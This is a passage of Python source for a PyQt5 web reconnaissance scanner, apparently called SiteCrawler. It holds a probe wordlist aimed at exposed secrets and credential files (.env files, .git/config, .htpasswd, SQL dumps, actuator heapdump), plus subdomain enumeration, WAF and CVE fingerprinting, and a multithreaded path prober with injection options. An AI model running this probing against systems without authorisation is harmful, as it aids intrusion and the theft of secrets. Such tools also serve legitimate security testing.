    "dashboard", "control-panel", "controlpanel", "panel",
    "backend", "back-end", "backoffice", "back-office",
    "cms", "cms/admin", "cms/api", "console", "console/login",
    "superadmin", "super-admin", "root",
    "graphql", "graphiql", "graphql/console", "playground", "graphql-playground",
    "api/graphql", "v1/graphql", "query", "graphql/schema", "graphql/introspection",
    "swagger", "swagger-ui", "swagger-ui.html", "swagger/index.html", "swagger/ui",
    "swagger/v1", "swagger/v2", "api-docs", "api-docs/v1", "api-docs/v2",
    "openapi", "openapi.json", "openapi.yaml", "openapi.yml",
    "api/swagger", "docs/api", "redoc", "api/redoc", "apidocs", "docs",
    "health", "healthcheck", "health-check", "health/ready", "health/live",
    "health/startup", "readiness", "liveness", "ready", "alive", "ping", "pong", "status",
    "metrics", "prometheus", "actuator", "actuator/health", "actuator/info",
    "actuator/metrics", "actuator/env", "actuator/beans", "actuator/mappings",
    "actuator/shutdown", "actuator/heapdump", "actuator/threaddump",
    "monitor", "monitoring", "api/health", "api/status", "api/ping",
    "version", "info", "about", "build", "build-info", "api/version", "api/info",
    "api/v1/health", "api/v2/health", "api/v1/status", "api/v2/status",
    "env", "environment", "config",
    ".env", ".env.local", ".env.production", ".env.development", ".env.staging",
    ".env.test", ".env.backup", ".env.old",
    "config.json", "config.yaml", "config.yml", "app.json", "manifest.json",
    "settings.json", "settings.yaml", "appsettings.json",
    ".git", ".git/config", ".git/HEAD", ".git/index", ".git/packed-refs",
    ".gitignore", ".htaccess", ".htpasswd",
    "robots.txt", "sitemap.xml", "crossdomain.xml", "security.txt", ".well-known/security.txt",
    "web.config", "WEB-INF/web.xml", "composer.json", "package.json", "Dockerfile",
    "docker-compose.yml", "requirements.txt", "Gemfile", "Pipfile",
    "backup.sql", "dump.sql", "database.sql", "db.sqlite", "db.sqlite3", "database.db",
    "backup.zip", "backup.tar.gz", "data.json", "export.json", "export.csv",
    "phpinfo.php", "test.php", "info.php", "php.ini",
    "wp-login.php", "wp-admin", "xmlrpc.php", "wp-json", "wp-json/wp/v2",
    "wp-json/wp/v2/users", "wp-content/debug.log",
    "telescope", "horizon", "nova",
    "upload", "uploads", "upload/file", "upload/image", "media", "media/upload",
    "files", "file", "static", "assets", "resources", "cdn", "images", "img", "docs", "documents",
    "search", "find", "lookup", "notifications", "notification", "messages", "message",
    "posts", "post", "articles", "article", "blog", "news", "settings", "setting",
    "logs", "log", "audit", "audit-log", "activity", "history",
    "reports", "report", "analytics", "statistics", "stats",
    "export", "import", "sync", "cache", "flush",
    "debug", "debug/info", "debug/vars", "trace",
    "internal", "internal/api", "private", "private/api",
    "api/internal", "api/private", "api/secret",
    "hidden", "secret", "secrets", "keys", "key",
    "index.php", "index.php?id=1", "index.php?page=1",
    "news.php", "news-read.php", "read.php", "article.php", "page.php", "view.php",
    "product.php", "item.php", "category.php", "user.php", "profile.php",
    "download.php", "file.php", "get.php", "fetch.php", "load.php",
    "show.php", "display.php", "content.php", "data.php", "query.php",
    "search.php", "results.php", "list.php", "detail.php",
    "login.php", "register.php", "signup.php", "forgot.php", "reset.php",
    "admin.php", "panel.php", "dashboard.php", "manage.php",
    "upload.php", "delete.php", "edit.php", "update.php", "add.php",
    "include.php", "config.php", "settings.php", "install.php",
    "news-read.php?id=1", "news-read.php?id=2", "news-read.php?id=36",
    "article.php?id=1", "page.php?id=1", "view.php?id=1",
    "product.php?id=1", "item.php?id=1", "category.php?id=1",
    "user.php?id=1", "profile.php?id=1", "read.php?id=1",
    "download.php?file=test", "file.php?name=test", "get.php?path=test",
    "index.php?page=home", "index.php?view=main", "index.php?module=home",
    "search.php?q=test", "results.php?query=test",
    "index.asp", "default.asp", "index.aspx", "default.aspx",
    "index.jsp", "default.jsp",
]

_seen = set()
API_PATHS = [x for x in API_PATHS if not (_seen.add(x) or x in _seen)]


from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QPushButton, QTextEdit, QTabWidget, QSplitter,
    QTableWidget, QTableWidgetItem, QHeaderView, QGroupBox, QCheckBox,
    QComboBox, QSpinBox, QProgressBar, QFrame, QScrollArea,
    QFileDialog, QMessageBox, QSizePolicy, QAbstractItemView,
    QDialog, QDialogButtonBox, QTextBrowser, QAction, QStatusBar
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer, pyqtSlot
from PyQt5.QtGui import (
    QColor, QFont, QTextCursor, QPalette, QPainter,
    QLinearGradient, QBrush, QPen
)

C = {
    "bg0": "#07090d", "bg1": "#0b0f15", "bg2": "#10161f", "bg3": "#151d28",
    "line": "#1a2d42", "line2": "#0d1e2d",
    "cyan": "#00d4ff", "green": "#00e87a", "red": "#ff2d55",
    "orange": "#ff8c00", "yellow": "#f0c040", "purple": "#b06aff", "blue": "#2d8cff",
    "t0": "#ddeeff", "t1": "#7a9bbf", "t2": "#3a5a78", "t3": "#1e3348",
}


def status_color(code):
    if code is None:               return C["t2"]
    if code in (200, 201, 204):   return C["green"]
    if code in (301, 302, 307, 308): return C["cyan"]
    if code in (401, 403):        return C["orange"]
    if code == 405:                return C["purple"]
    if code == 429:                return C["yellow"]
    if code >= 500:                return C["red"]
    return C["t1"]


def risk_color(risk):
    return {"CRITICAL": C["red"], "HIGH": C["orange"], "MEDIUM": C["yellow"], "LOW": C["green"]}.get(risk, C["t1"])


def risk_bg(risk):
    return {"CRITICAL": "#1a0008", "HIGH": "#160800", "MEDIUM": "#141000", "LOW": "#001a08"}.get(risk, "transparent")


QSS = f"""
* {{ font-family: 'Consolas','Courier New',monospace; font-size: 12px; color: {C['t0']}; background: transparent; }}
QMainWindow,QDialog {{ background-color: {C['bg0']}; }}
QWidget#root_widget {{ background-color: {C['bg0']}; }}
QScrollBar:vertical {{ background:{C['bg0']}; width:7px; margin:0; }}
QScrollBar::handle:vertical {{ background:{C['line']}; border-radius:3px; min-height:24px; }}
QScrollBar::handle:vertical:hover {{ background:{C['cyan']}; }}
QScrollBar::add-line:vertical,QScrollBar::sub-line:vertical {{ height:0; }}
QScrollBar:horizontal {{ background:{C['bg0']}; height:7px; }}
QScrollBar::handle:horizontal {{ background:{C['line']}; border-radius:3px; min-width:24px; }}
QScrollBar::handle:horizontal:hover {{ background:{C['cyan']}; }}
QScrollBar::add-line:horizontal,QScrollBar::sub-line:horizontal {{ width:0; }}
QMenuBar {{ background-color:{C['bg1']}; border-bottom:1px solid {C['line']}; padding:2px 4px; }}
QMenuBar::item {{ padding:4px 10px; border-radius:3px; }}
QMenuBar::item:selected {{ background:{C['bg2']}; color:{C['cyan']}; }}
QMenu {{ background:{C['bg1']}; border:1px solid {C['line']}; padding:4px; }}
QMenu::item {{ padding:5px 24px 5px 12px; border-radius:3px; }}
QMenu::item:selected {{ background:{C['bg2']}; color:{C['cyan']}; }}
QMenu::separator {{ height:1px; background:{C['line']}; margin:4px 8px; }}
QStatusBar {{ background:{C['bg1']}; border-top:1px solid {C['line']}; color:{C['t1']}; font-size:11px; }}
QStatusBar::item {{ border:none; }}
QTabWidget::pane {{ border:1px solid {C['line']}; background:{C['bg1']}; border-radius:0 4px 4px 4px; }}
QTabBar {{ background:transparent; }}
QTabBar::tab {{ background:{C['bg0']}; color:{C['t2']}; padding:8px 22px; border:1px solid {C['line']};
               border-bottom:none; border-top-left-radius:5px; border-top-right-radius:5px; margin-right:2px; font-size:11px; letter-spacing:1px; }}
QTabBar::tab:selected {{ background:{C['bg1']}; color:{C['cyan']}; border-color:{C['cyan']}; border-bottom:1px solid {C['bg1']}; }}
QTabBar::tab:hover:!selected {{ color:{C['t0']}; background:{C['bg2']}; }}
QGroupBox {{ background:{C['bg2']}; border:1px solid {C['line']}; border-radius:6px; margin-top:18px; padding:10px; }}
QGroupBox::title {{ subcontrol-origin:margin; left:14px; top:-1px; padding:2px 8px; background:{C['bg2']};
                   color:{C['cyan']}; font-size:10px; letter-spacing:2px; border-radius:3px; border:1px solid {C['line']}; }}
QLineEdit {{ background:{C['bg3']}; border:1px solid {C['line']}; border-radius:5px; padding:7px 10px; color:{C['t0']}; font-size:12px; }}
QLineEdit:focus {{ border-color:{C['cyan']}; background:#0e1e2f; }}
QLineEdit:disabled {{ color:{C['t2']}; background:{C['bg1']}; }}
QTextEdit,QTextBrowser {{ background:{C['bg0']}; border:1px solid {C['line']}; border-radius:5px; color:{C['green']}; font-size:12px; padding:6px; }}
QPushButton {{ background:{C['bg2']}; border:1px solid {C['line']}; border-radius:5px; color:{C['t0']}; padding:7px 16px; font-size:11px; letter-spacing:1px; }}
QPushButton:hover {{ background:#1a2d42; border-color:{C['cyan']}; color:{C['cyan']}; }}
QPushButton:pressed {{ background:#0a1e30; }}
QPushButton:disabled {{ color:{C['t2']}; border-color:{C['t3']}; background:{C['bg1']}; }}
QPushButton#btn_start {{ background:#003d22; border:1px solid {C['green']}; color:{C['green']};
                         font-size:13px; font-weight:bold; padding:11px 0; border-radius:6px; letter-spacing:2px; }}
QPushButton#btn_start:hover {{ background:#005530; }}
QPushButton#btn_start:pressed {{ background:#002516; }}
QPushButton#btn_stop {{ background:#3a000e; border:1px solid {C['red']}; color:{C['red']};
                        font-size:12px; font-weight:bold; padding:9px 0; border-radius:6px; letter-spacing:2px; }}
QPushButton#btn_stop:hover {{ background:#520010; }}
QPushButton#btn_action {{ background:#001c2e; border:1px solid {C['cyan']}; color:{C['cyan']}; padding:6px 14px; font-size:11px; border-radius:5px; }}
QPushButton#btn_action:hover {{ background:#002a45; }}
QComboBox {{ background:{C['bg3']}; border:1px solid {C['line']}; border-radius:5px; padding:6px 10px; color:{C['t0']}; }}
QComboBox:focus {{ border-color:{C['cyan']}; }}
QComboBox::drop-down {{ border:none; width:22px; }}
QComboBox QAbstractItemView {{ background:{C['bg1']}; border:1px solid {C['line']}; selection-background-color:{C['bg2']}; selection-color:{C['cyan']}; outline:none; }}
QSpinBox {{ background:{C['bg3']}; border:1px solid {C['line']}; border-radius:5px; padding:6px 8px; color:{C['t0']}; }}
QSpinBox:focus {{ border-color:{C['cyan']}; }}
QSpinBox::up-button,QSpinBox::down-button {{ background:{C['bg2']}; border:none; width:18px; }}
QSpinBox::up-button:hover,QSpinBox::down-button:hover {{ background:{C['line']}; }}
QCheckBox {{ color:{C['t0']}; spacing:8px; font-size:12px; }}
QCheckBox::indicator {{ width:15px; height:15px; border:1px solid {C['line']}; border-radius:3px; background:{C['bg3']}; }}
QCheckBox::indicator:checked {{ background:{C['cyan']}; border-color:{C['cyan']}; }}
QProgressBar {{ background:{C['bg0']}; border:1px solid {C['line']}; border-radius:4px; height:8px; text-align:center; color:transparent; }}
QProgressBar::chunk {{ background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 {C['cyan']},stop:1 {C['green']}); border-radius:4px; }}
QTableWidget {{ background:{C['bg0']}; border:1px solid {C['line']}; border-radius:5px; gridline-color:{C['line2']};
               selection-background-color:#0d2236; selection-color:{C['cyan']}; alternate-background-color:{C['bg2']}; font-size:12px; outline:none; }}
QTableWidget::item {{ padding:7px 10px; border-bottom:1px solid {C['line2']}; }}
QTableWidget::item:selected {{ background:#0d2236; color:{C['t0']}; }}
QHeaderView::section {{ background:{C['bg1']}; color:{C['cyan']}; border:none; border-right:1px solid {C['line2']};
                        border-bottom:2px solid {C['line']}; padding:8px 10px; font-size:10px; letter-spacing:2px; font-weight:bold; }}
QSplitter::handle {{ background:{C['line']}; }}
QSplitter::handle:hover {{ background:{C['cyan']}; }}
QLabel {{ background:transparent; }}
"""


class ScanWorker(QThread):
    log_signal       = pyqtSignal(str, str)
    result_signal    = pyqtSignal(dict)
    recon_signal     = pyqtSignal(dict)
    progress_signal  = pyqtSignal(int, int)
    done_signal      = pyqtSignal(float)
    baseline_signal  = pyqtSignal(dict)
    subdomain_signal = pyqtSignal(list)

    def __init__(self, config):
        super().__init__()
        self.config   = config
        self._running = True

    def stop(self):
        self._running = False

    def emit_log(self, msg, level="info"):
        self.log_signal.emit(msg, level)

    def run(self):
        global fingerprints, server_profile
        fingerprints = {}
        server_profile = {}
        cfg   = self.config
        start = time.time()

        if not REQUESTS_OK:
            self.emit_log("ERROR: 'requests' library not installed  →  pip install requests", "error")
            self.done_signal.emit(0)
            return

        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (compatible; SiteCrawler/6.0)",
            "Accept":     "application/json, text/html, */*",
        })

        custom_headers = {}
        for h in cfg.get("headers", []):
            if ":" in h:
                k, v = h.split(":", 1)
                custom_headers[k.strip()] = v.strip()
        if cfg.get("token"):
            custom_headers["Authorization"] = f"Bearer {cfg['token']}"

        base_url   = cfg["url"]
        methods    = cfg["methods"]
        threads    = cfg["threads"]
        inject     = cfg["inject"]
        param_scan = cfg.get("param_scan", False)
        mode       = cfg["mode"]

        self.emit_log("Building baseline fingerprint (catch-all detection)…", "info")
        baseline = BaselineProfile()
        baseline.build(session, base_url, custom_headers)
        if baseline.is_catchall:
            self.emit_log(
                f"⚠ Catch-all detected! Server returns HTTP {baseline.status} for random paths. "
                "FP filter active — only unique responses will be shown.",
                "warn"
            )
        else:
            self.emit_log(
                f"Baseline: server returns {baseline.status} for non-existent paths. "
                "Standard filtering active. ALL responses (302/405/500) will be shown.",
                "ok"
            )
        self.baseline_signal.emit({
            "is_catchall":  baseline.is_catchall,
            "status":       baseline.status,
            "body_hash":    baseline.body_hash,
            "body_len":     baseline.body_len,
            "title":        baseline.title,
            "content_type": baseline.content_type,
        })

        if cfg.get("subdomain_enum", False) and self._running:
            parsed = urlparse(base_url)
            host   = parsed.hostname
            self.emit_log(f"Starting subdomain enumeration for {host}…", "info")
            subs = enumerate_subdomains(host)
            if subs:
                self.emit_log(f"Found {len(subs)} live subdomains!", "ok")
                for s in subs:
                    self.emit_log(f"  ✔ {s['subdomain']}  →  {s['ip']}", "ok")
            else:
                self.emit_log("No live subdomains found from wordlist.", "info")
            self.subdomain_signal.emit(subs)

        if cfg.get("recon", True) and self._running:
            self.emit_log("Starting server reconnaissance…", "info")
            profile = self._do_recon(base_url, session, custom_headers)
            server_profile.update(profile)
            self.recon_signal.emit(profile)

        if not self._running:
            self.done_signal.emit(time.time() - start)
            return

        paths = []
        if mode in ("1", "4", "5"):
            wl = cfg.get("wordlist", "")
            if wl:
                try:
                    with open(wl, encoding="utf-8") as f:
                        paths += [l.strip() for l in f if l.strip() and not l.startswith("#")]
                except Exception as e:
                    self.emit_log(f"Wordlist error: {e}", "warn")
        if mode in ("3", "4", "5", "6"):
            paths += API_PATHS
        if mode in ("2", "4", "5"):
            paths += self._crawl_paths(base_url, session, custom_headers)
        paths = list(dict.fromkeys(paths))

        if mode == "6" and cfg.get("probe_path"):
            paths = [cfg["probe_path"]]

        if cfg.get("custom_params"):
            for cp in cfg["custom_params"].splitlines():
                cp = cp.strip()
                if cp and cp not in paths:
                    paths.append(cp)

        total = len(paths)
        self.emit_log(f"Scanning {total} paths × {len(methods)} methods  [{threads} threads]", "info")
        self.emit_log("Showing ALL responses: 200, 301, 302, 403, 405, 500 etc.", "info")

        all_m = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"] if mode == "6" else methods
        done  = 0

        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = {
                ex.submit(fingerprint_endpoint, base_url, p, session,
                          custom_headers, all_m, baseline, inject, param_scan): p
                for p in paths
            }
            for future in as_completed(futures):
                if not self._running:
                    break
                done += 1
                self.progress_signal.emit(done, total)
                fp = future.result()
                if fp:
                    self.result_signal.emit(fp)
                    level    = {"CRITICAL": "critical", "HIGH": "high", "MEDIUM": "medium"}.get(fp["risk"], "ok")
                    codes    = {m: r["status"] for m, r in fp["interesting"].items()}
                    code_str = "  ".join(f"{m}={s}" for m, s in codes.items())
                    vuln_tag = f"  [VULN:{len(fp.get('param_vulns',[]))}]" if fp.get("param_vulns") else ""
                    self.emit_log(f"[{fp['risk']:<8}]  {fp['path']:<55}  {code_str}{vuln_tag}", level)

        self.done_signal.emit(time.time() - start)

    def _do_recon(self, base_url, session, headers):
        parsed  = urlparse(base_url)
        host    = parsed.hostname
        port    = parsed.port or (443 if parsed.scheme == "https" else 80)
        profile = {"host": host, "port": port, "scheme": parsed.scheme,
                   "dns": {}, "tls": {}, "headers": {}, "tech": [], "waf": [],
                   "versions": {}, "cves": [], "cookies": {"info": [], "issues": []}, "timing": {}}
        profile["dns"] = recon_dns(host)
        if parsed.scheme == "https":
            profile["tls"] = inspect_tls(host, port)
        try:
            t0   = time.time()
            resp = session.get(base_url, headers=headers, timeout=10, allow_redirects=True)
            profile["timing"]   = {"base_ms": round((time.time() - t0) * 1000),
                                    "redirects": len(resp.history), "final_url": resp.url}
            profile["status"]   = resp.status_code
            profile["headers"]  = dict(resp.headers)
            profile["tech"]     = detect_tech(dict(resp.headers))
            profile["waf"]      = detect_waf(dict(resp.headers), resp.text[:2000])
            profile["versions"] = extract_versions(dict(resp.headers), resp.text[:5000])
            profile["cves"]     = check_cves(profile["versions"])
            ci, cx              = analyze_cookies(dict(resp.headers))
            profile["cookies"]  = {"info": ci, "issues": cx}
            profile["crawled_params"] = self._extract_page_params(resp.text, base_url)
        except Exception as e:
            profile["error"] = str(e)
        return profile

    def _extract_page_params(self, body, base_url):
        found = {}
        links_with_params = re.findall(r'href=["\']([^"\']*\?[^"\']+)["\']', body, re.I)
        for lp in links_with_params:
            parsed = urlparse(lp)
            if parsed.query:
                for k, v in parse_qs(parsed.query).items():
                    found[k] = v[0] if v else ""
        return found

    def _crawl_paths(self, base_url, session, headers):
        paths = []
        try:
            resp        = session.get(base_url, timeout=8, headers=headers)
            links       = re.findall(r'href=["\']([^"\']+)["\']', resp.text)
            assets      = re.findall(r'src=["\']([^"\']+)["\']', resp.text)
            api_refs    = re.findall(r'["\'`](/(?:api|v\d|rest|graphql|auth)[^"\'`\s]{1,80})', resp.text)
            scripts     = re.findall(r'["\'`]([^"\'`\s]*\.php[^"\'`\s]*)["\']', resp.text, re.I)
            base_netloc = urlparse(base_url).netloc
            for link in links + assets + api_refs + scripts:
                if link.startswith("http"):
                    p = urlparse(link)
                    if p.netloc != base_netloc:
                        continue
                    path = p.path.lstrip("/")
                    if p.query:
                        path += "?" + p.query
                    paths.append(path)
                elif link.startswith("/"):
                    path = link.lstrip("/")
                    paths.append(path)
            self.emit_log(f"Crawl extracted {len(paths)} paths (including parameterized URLs) from page", "info")
        except Exception as e:
            self.emit_log(f"Crawl error: {e}", "warn")
        return paths


class TopBar(QWidget):
    def __init__(self):
        super().__init__()
        self.setFixedHeight(72)
        self._tick = 0
        t = QTimer(self)
        t.timeout.connect(self._animate)
        t.start(50)

    def _animate(self):
        self._tick += 1
        self.update()

    def paintEvent(self, ev):
        import math
        p = QPainter(self)
        p.setRenderHint(QPainter.Antialiasing)
        grad = QLinearGradient(0, 0, self.width(), 0)
        grad.setColorAt(0, QColor("#050810"))
        grad.setColorAt(0.4, QColor("#071525"))
        grad.setColorAt(1, QColor("#050810"))
        p.fillRect(self.rect(), QBrush(grad))
        p.setPen(QPen(QColor("#0a1e30"), 1))
        for x in range(0, self.width(), 48):
            p.drawLine(x, 0, x, self.height())
        for y in range(0, self.height(), 24):
            p.drawLine(0, y, self.width(), y)
        p.setPen(QPen(QColor(C["cyan"])))
        p.drawLine(0, self.height() - 1, self.width(), self.height() - 1)
        p.fillRect(0, 0, 3, self.height(), QColor(C["cyan"]))
        f1 = QFont("Consolas", 22, QFont.Bold)
        p.setFont(f1)
        p.setPen(QColor(C["cyan"]))
        p.drawText(16, 48, "SITE")
        p.setPen(QColor(C["green"]))
        p.drawText(88, 48, "CRAWLER")
        p.setPen(QPen(QColor(C["line"]), 1))
        p.drawLine(235, 20, 235, 52)
        f2 = QFont("Consolas", 9)
        p.setFont(f2)
        p.setPen(QColor(C["t2"]))
        p.drawText(244, 34, "v6.0 — Show All Responses + Param Scanning + Subdomain Enum")
        p.drawText(244, 50, "CoderSigma")
        now = datetime.datetime.now()
        f3  = QFont("Consolas", 11, QFont.Bold)
        p.setFont(f3)
        p.setPen(QColor(C["t1"]))
        p.drawText(self.width() - 130, 38, now.strftime("%H:%M:%S"))
        f4 = QFont("Consolas", 9)
        p.setFont(f4)
        p.setPen(QColor(C["t2"]))
        p.drawText(self.width() - 130, 54, now.strftime("%Y-%m-%d"))
        alpha = int(120 + 100 * abs(math.sin(self._tick * 0.08)))
        p.setBrush(QBrush(QColor(0, 232, 122, alpha)))
        p.setPen(Qt.NoPen)
        p.drawEllipse(self.width() - 154, 27, 8, 8)


class SectionLabel(QLabel):
    def __init__(self, text):
        super().__init__(text.upper())
        self.setFixedHeight(28)
        self.setStyleSheet(f"""
            QLabel {{ color:{C['cyan']}; font-size:10px; letter-spacing:3px; font-weight:bold;
                     padding-left:10px; border-left:3px solid {C['cyan']}; background:{C['bg1']}; }}
        """)


class StatCard(QFrame):
    def __init__(self, title, value="0", accent=None, icon=""):
        super().__init__()
        self.accent = accent or C["cyan"]
        self.setStyleSheet(f"""
            QFrame {{ background:{C['bg2']}; border:1px solid {C['line']};
                     border-top:2px solid {self.accent}; border-radius:6px; }}
        """)
        lay = QVBoxLayout(self)
        lay.setContentsMargins(14, 10, 14, 10)
        lay.setSpacing(3)
        top = QHBoxLayout()
        lbl_icon = QLabel(icon)
        lbl_icon.setStyleSheet(f"font-size:16px;color:{self.accent};border:none;background:transparent;")
        top.addWidget(lbl_icon)
        top.addStretch()
        self.val = QLabel(value)
        self.val.setStyleSheet(f"""
            QLabel {{ font-size:26px; font-weight:bold; color:{self.accent}; border:none; background:transparent; }}
        """)
        self.val.setAlignment(Qt.AlignCenter)
        lbl_title = QLabel(title.upper())
        lbl_title.setStyleSheet(f"font-size:9px;color:{C['t2']};letter-spacing:2px;border:none;background:transparent;")
        lbl_title.setAlignment(Qt.AlignCenter)
        lay.addLayout(top)
        lay.addWidget(self.val)
        lay.addWidget(lbl_title)

    def set_value(self, v):
        self.val.setText(str(v))


class LogTerminal(QTextEdit):
    LEVEL_COLORS = {
        "info": "#ddeeff", "ok": "#00e87a", "warn": "#ff8c00", "error": "#ff2d55",
        "critical": "#ff2d55", "high": "#ff8c00", "medium": "#f0c040", "debug": "#3a5a78",
    }

    def __init__(self):
        super().__init__()
        self.setReadOnly(True)
        self.setFont(QFont("Consolas", 12))
        self.document().setMaximumBlockCount(8000)

    def log(self, msg, level="info"):
        color    = self.LEVEL_COLORS.get(level, C["t0"])
        ts       = datetime.datetime.now().strftime("%H:%M:%S")
        badge_map = {
            "info":    f"<span style='color:{C['t2']}'>INFO </span>",
            "ok":      f"<span style='color:{C['green']}'>  OK  </span>",
            "warn":    f"<span style='color:{C['orange']}'>WARN </span>",
            "error":   f"<span style='color:{C['red']}'>ERR  </span>",
            "critical": f"<span style='color:{C['red']}'>CRIT </span>",
            "high":    f"<span style='color:{C['orange']}'>HIGH </span>",
            "medium":  f"<span style='color:{C['yellow']}'>MED  </span>",
            "debug":   f"<span style='color:{C['t2']}'>DBG  </span>",
        }
        badge    = badge_map.get(level, f"<span style='color:{C['t2']}'>.... </span>")
        safe_msg = msg.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        html     = (f'<span style="color:{C["t3"]}">[{ts}]</span> {badge} '
                    f'<span style="color:{color}">{safe_msg}</span><br>')
        cur = self.textCursor()
        cur.movePosition(QTextCursor.End)
        cur.insertHtml(html)
        self.setTextCursor(cur)
        self.ensureCursorVisible()


class ResultsTable(QTableWidget):
    COLS = ["Risk", "Status", "Methods", "Path / URL", "Params", "Vulns", "Content-Type", "Tech", "WAF", "Body Len", "Redirects"]

    def __init__(self):
        super().__init__(0, len(self.COLS))
        self.setHorizontalHeaderLabels(self.COLS)
        hh = self.horizontalHeader()
        hh.setSectionResizeMode(3, QHeaderView.Stretch)
        for i in [0, 1, 2, 4, 5, 6, 7, 8, 9, 10]:
            hh.setSectionResizeMode(i, QHeaderView.ResizeToContents)
        self.verticalHeader().setVisible(False)
        self.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.setSortingEnabled(True)
        self.setAlternatingRowColors(True)
        self.setShowGrid(False)
        self.verticalHeader().setDefaultSectionSize(34)

    def add_fp(self, fp):
        self.setSortingEnabled(False)
        row = self.rowCount()
        self.insertRow(row)
        risk        = fp["risk"]
        rc          = risk_color(risk)
        rb          = risk_bg(risk)
        interesting = fp.get("interesting", {})
        working     = fp.get("working", [])
        ba          = fp.get("sample_body_analysis", {})
        param_vulns = fp.get("param_vulns", [])
        status_str  = "  ".join(f"{m}={r['status']}" for m, r in interesting.items() if r.get("status"))
        first_s     = next((r["status"] for r in interesting.values() if r.get("status")), None)
        sc          = status_color(first_s)
        ct          = fp.get("sample_headers", {}).get("content-type", "").split(";")[0].strip()[:28]
        body_len    = ba.get("char_len", 0)
        redirect_n  = len(fp.get("redirect_chain", []))
        has_params  = "✦" if fp.get("has_params") else "-"
        vuln_str    = ", ".join(set(v["vuln_type"].upper() for v in param_vulns)) if param_vulns else "-"

        cells = [
            (risk,                                            rc,            rb),
            (status_str or "-",                              sc,            rb),
            (", ".join(working) or "N/A",                   C["green"],    rb),
            (fp["path"],                                     C["t0"],       rb),
            (has_params,                                     C["cyan"] if fp.get("has_params") else C["t2"], rb),
            (vuln_str,                                       C["red"] if param_vulns else C["t2"], rb),
            (ct or "-",                                      C["t1"],       rb),
            (", ".join(fp.get("tech", [])) or "-",          C["cyan"],     rb),
            (", ".join(fp.get("waf", [])) or "-",           C["purple"],   rb),
            (f"{body_len:,}",                               C["t1"],       rb),
            (f"→{redirect_n}" if redirect_n else "-",       C["cyan"] if redirect_n else C["t2"], rb),
        ]
        for col, (text, fg, bg) in enumerate(cells):
            item = QTableWidgetItem(text)
            item.setForeground(QColor(fg))
            if bg and bg != "transparent":
                item.setBackground(QColor(bg))
            if col == 0:
                item.setFont(QFont("Consolas", 11, QFont.Bold))
            self.setItem(row, col, item)
        self.setSortingEnabled(True)


def _html_head(title=""):
    t1, t2, line, bg0, bg1, bg2 = C["t1"], C["t2"], C["line"], C["bg0"], C["bg1"], C["bg2"]
    cyan, green, red, orange, yellow = C["cyan"], C["green"], C["red"], C["orange"], C["yellow"]
    return f"""<!DOCTYPE html><html><head><meta charset='utf-8'>
<style>
*    {{margin:0;padding:0;box-sizing:border-box;}}
body {{background:{bg0};color:{C['t0']};font-family:'Consolas','Courier New',monospace;font-size:12px;padding:20px;line-height:1.6;}}
h1   {{color:{cyan};font-size:16px;letter-spacing:3px;border-bottom:2px solid {line};padding-bottom:10px;margin-bottom:18px;}}
h2   {{color:{cyan};font-size:13px;letter-spacing:2px;margin:22px 0 10px;border-left:3px solid {cyan};padding-left:10px;}}
h3   {{color:{t1};font-size:11px;letter-spacing:2px;margin:14px 0 6px;text-transform:uppercase;}}
p    {{color:{C['t0']};margin:4px 0;}}
.kv  {{display:flex;margin:4px 0;align-items:baseline;}}
.key {{color:{t2};min-width:200px;font-size:11px;flex-shrink:0;}}
.val {{color:{C['t0']};word-break:break-all;}}
.ok  {{color:{green};}} .warn{{color:{orange};}} .crit{{color:{red};font-weight:bold;}}
.med {{color:{yellow};}} .cyan{{color:{cyan};}} .dim{{color:{t2};}} .purple{{color:{C['purple']};}}
.badge {{display:inline-block;padding:2px 8px;border-radius:3px;font-size:10px;font-weight:bold;letter-spacing:1px;margin:2px;}}
.badge-crit {{background:#3a0010;color:{red};border:1px solid {red};}}
.badge-high {{background:#2a1500;color:{orange};border:1px solid {orange};}}
.badge-med  {{background:#1e1800;color:{yellow};border:1px solid {yellow};}}
.badge-low  {{background:#001a0a;color:{green};border:1px solid {green};}}
.badge-ok   {{background:#001a0a;color:{green};border:1px solid {green};}}
.badge-cyan {{background:#001c2e;color:{cyan};border:1px solid {cyan};}}
.card {{background:{bg2};border:1px solid {line};border-radius:6px;padding:14px;margin:8px 0;}}
.card-crit {{border-left:3px solid {red};}}
.card-high {{border-left:3px solid {orange};}}
.card-med  {{border-left:3px solid {yellow};}}
table {{border-collapse:collapse;width:100%;margin:8px 0;}}
th    {{background:{bg1};color:{cyan};padding:8px 12px;text-align:left;font-size:10px;letter-spacing:2px;border-bottom:2px solid {line};}}
td    {{padding:7px 12px;border-bottom:1px solid {C['line2']};vertical-align:top;word-break:break-all;}}
tr:hover td {{background:{bg2};}}
pre  {{background:{bg1};border:1px solid {line};border-radius:4px;padding:12px;white-space:pre-wrap;
      word-wrap:break-word;color:{green};font-size:11px;margin:6px 0;max-height:400px;overflow-y:auto;}}
.sep {{height:1px;background:{line};margin:16px 0;}}
.grid-2 {{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:12px 0;}}
.stat-block {{background:{bg2};border:1px solid {line};border-radius:6px;padding:14px;text-align:center;}}
.stat-num {{font-size:28px;font-weight:bold;}}
.stat-lbl {{font-size:9px;color:{t2};letter-spacing:2px;margin-top:2px;}}
.alert-box {{background:#1a0008;border:1px solid {red};border-radius:4px;padding:10px;margin:6px 0;}}
.info-box  {{background:#001525;border:1px solid {cyan};border-radius:4px;padding:10px;margin:6px 0;}}
.vuln-box  {{background:#1a0800;border:1px solid {orange};border-radius:4px;padding:10px;margin:6px 0;}}
</style></head><body>"""


def _html_close():
    return "</body></html>"


class DetailView(QTextBrowser):
    def __init__(self):
        super().__init__()
        self.setOpenLinks(False)

    def render(self, fp):
        if not fp:
            return
        risk      = fp["risk"]
        html      = _html_head("Detail")
        badge_cls = {"CRITICAL": "badge-crit", "HIGH": "badge-high", "MEDIUM": "badge-med", "LOW": "badge-low"}.get(risk, "badge-ok")
        html += f"<h1><span class='badge {badge_cls}'>{risk}</span>  {fp['url']}</h1>"

        html += "<h2>HTTP Method Probe Results</h2>"
